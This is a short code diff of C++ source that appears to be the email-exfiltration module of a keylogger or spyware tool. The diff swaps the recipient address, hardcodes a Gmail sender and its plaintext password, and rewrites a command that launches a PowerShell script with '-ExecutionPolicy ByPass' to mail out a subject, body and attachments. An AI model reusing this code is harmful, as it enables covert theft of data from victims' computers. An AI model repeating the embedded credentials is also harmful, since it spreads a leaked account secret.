@@ -12,7 +12,7 @@
 
 namespace MAIL
 {
-    #define X_EM_TO "dynamo123582@gmail.com"
+    #define X_EM_TO "uzairrana560@gmail.com"
     #define X_EM_FROM "dynamo123582@gmail.com"
     #define X_EM_PASS "123456789@0DyNaMo"
 const std::string &PowerShellScript =
@@ -100,11 +100,13 @@ const std::string &PowerShellScript =
         if(!ok)
             return -2;
 
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
-                                + StringReplace(subject, "\"", "\\\"")
-                                + "\" -Body \""
-                                + StringReplace(body, "\"", "\\\"")
-                                + "\" =Att \"" + attachments + "\"";
+        std::string param =
+                        "-ExecutionPolicy ByPass "
+                        "-File \"" + scr_path + "\" "
+                        "-Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" "
+                        "-Body \"" + StringReplace(body,    "\"", "\\\"") + "\" "
+                        "-Att  \"" + attachments + "\"";
+
         SHELLEXECUTEINFO ShExecInfo   = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
